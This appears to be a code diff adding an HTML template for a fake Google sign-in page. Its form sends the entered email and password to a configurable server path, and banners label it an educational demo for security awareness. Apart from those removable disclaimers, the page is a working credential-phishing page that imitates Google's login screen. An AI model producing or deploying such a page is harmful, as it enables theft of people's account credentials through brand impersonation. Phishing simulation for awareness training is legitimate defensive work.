@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Google Sign-In</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-white">
+    <div class="bg-red-100 border border-red-400 text-red-700 p-2 text-center">
+        <strong>EDUCATIONAL DEMO:</strong> {{ warning }}
+    </div>
+
+    <div class="max-w-md mx-auto py-8 px-4">
+        <div class="text-center mb-8">
+            <div class="w-16 h-16 bg-blue-500 rounded-full mx-auto mb-4 flex items-center justify-center">
+                <span class="text-white text-2xl font-bold">G</span>
+            </div>
+            <h1 class="text-2xl font-semibold">Sign in</h1>
+            <p class="text-gray-600">Use your Google Account</p>
+        </div>
+
+        <form action="/{{ custom_path }}/submit" method="POST" class="space-y-4">
+            <input type="email" name="email" placeholder="Email or phone" 
+                   class="w-full p-3 border rounded focus:outline-none focus:border-blue-500" required>
+            
+            <input type="password" name="password" placeholder="Enter your password" 
+                   class="w-full p-3 border rounded focus:outline-none focus:border-blue-500" required>
+
+            <div class="text-sm text-blue-600">
+                <a href="#">Forgot email?</a>
+            </div>
+
+            <div class="text-sm text-gray-600">
+                Not your computer? Use Guest mode to sign in privately.
+            </div>
+
+            <div class="flex justify-between items-center">
+                <a href="#" class="text-blue-600 text-sm">Create account</a>
+                <button type="submit" class="bg-blue-500 text-white px-6 py-2 rounded hover:bg-blue-600">
+                    Next
+                </button>
+            </div>
+        </form>
+
+        <div class="mt-6 p-3 bg-blue-50 rounded text-sm">
+            <strong>Educational Purpose:</strong> This simulates Google's login page for security awareness.
+        </div>
+    </div>
+</body>
+</html>
